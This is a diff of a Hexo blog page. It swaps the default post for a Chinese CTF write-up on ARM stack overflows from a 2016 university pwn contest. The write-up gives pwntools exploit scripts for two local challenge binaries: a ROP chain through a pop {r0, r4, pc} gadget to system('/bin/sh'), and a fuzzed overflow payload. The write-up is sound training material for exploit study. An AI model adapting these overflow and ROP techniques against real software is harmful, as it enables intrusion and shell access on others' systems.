@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hello World | Hexo</title>
+  <title>ARM环境下栈溢出攻击初探 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta name="keywords">
+  <meta name="description" content="题目来自于2016年全国高校网安联赛pwn专场。 参考文献：http://www.freebuf.com/articles/terminal/107276.html 其中有一题warmup的题目，常规思路，使用file命令查看该文件格式，发现是arm下静态文件，之后常规考虑用ROPgadget生成ropchain，放入栈中执行，但是这边有区别，arm是以r0寄存器存放第一个函数参数的。所以我们需要">
+<meta name="keywords" content="pwn,ARM">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2017/04/27/hello-world/index.html">
+<meta property="og:title" content="ARM环境下栈溢出攻击初探">
+<meta property="og:url" content="http://yoursite.com/2017/04/07/ARM-overflow/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta property="og:updated_time" content="2017-04-28T06:46:31.235Z">
+<meta property="og:description" content="题目来自于2016年全国高校网安联赛pwn专场。 参考文献：http://www.freebuf.com/articles/terminal/107276.html 其中有一题warmup的题目，常规思路，使用file命令查看该文件格式，发现是arm下静态文件，之后常规考虑用ROPgadget生成ropchain，放入栈中执行，但是这边有区别，arm是以r0寄存器存放第一个函数参数的。所以我们需要">
+<meta property="og:updated_time" content="2017-04-10T15:52:11.099Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="ARM环境下栈溢出攻击初探">
+<meta name="twitter:description" content="题目来自于2016年全国高校网安联赛pwn专场。 参考文献：http://www.freebuf.com/articles/terminal/107276.html 其中有一题warmup的题目，常规思路，使用file命令查看该文件格式，发现是arm下静态文件，之后常规考虑用ROPgadget生成ropchain，放入栈中执行，但是这边有区别，arm是以r0寄存器存放第一个函数参数的。所以我们需要">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -136,34 +136,36 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ARM-overflow" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      ARM环境下栈溢出攻击初探
     </h1>
   
 
-        <a href="/2017/04/27/hello-world/" class="archive-article-date">
-  	<time datetime="2017-04-28T06:46:31.235Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-27</time>
+        <a href="/2017/04/07/ARM-overflow/" class="archive-article-date">
+  	<time datetime="2017-04-07T08:34:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-07</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
-
+        <p>题目来自于2016年全国高校网安联赛pwn专场。</p>
+<p>参考文献：<a href="http://www.freebuf.com/articles/terminal/107276.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/107276.html</a></p>
+<p>其中有一题warmup的题目，常规思路，使用file命令查看该文件格式，发现是arm下静态文件，之后常规考虑用ROPgadget生成ropchain，放入栈中执行，但是这边有区别，arm是以r0寄存器存放第一个函数参数的。所以我们需要手工构造ropchain，首先去找system函数，虽然该bin文件去符号化了，但是由于存在/bin/sh字符串，跟踪一下就发现了如下函数。</p>
+<p>这不就是system函数么。。。</p>
+<p>接着用ROPgadget来找一个控制r0寄存器的ropchain就可以了。。如下命令</p>
+<p><code>ROPgadget --binary warmup --only &quot;pop&quot;|grep r0</code></p>
+<p>找到了</p>
+<p><code>0x00020904 : pop {r0, r4, pc}</code></p>
+<p>接着就剩下构造ropchian并执行了，如下脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">p = process(<span class="string">'./warmup'</span>)</div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">p.sendline()</div><div class="line">raw_input()</div><div class="line">pr0_pr4_ret  =<span class="number">0x00020904</span></div><div class="line">bin_sh = <span class="number">0x6C384</span></div><div class="line">system = <span class="number">0x110B4</span></div><div class="line">payload = p32(pr0_pr4_ret)+p32(bin_sh)+p32(<span class="number">0</span>)+p32(system)</div><div class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x70</span>+payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>另一题login，模糊测试一下直接出payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">p = process(<span class="string">'./login'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x5d'</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Code\n\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
       
 
       
@@ -192,6 +194,11 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ARM/">ARM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+	</div>
+
       
 
       
@@ -242,7 +249,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/04/27/hello-world/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/04/07/ARM-overflow/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -256,15 +263,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/04/27/2017-429-final/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/04/06/fastbin-attack/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          【pwn】2017-429final
+          fastbin attack 利用
         
       </div>
     </a>
   
+  
+    <a href="/2017/04/08/T3CTF2017/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">【pwn】T3CTF2017 堆溢出以及return to  dl slove</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
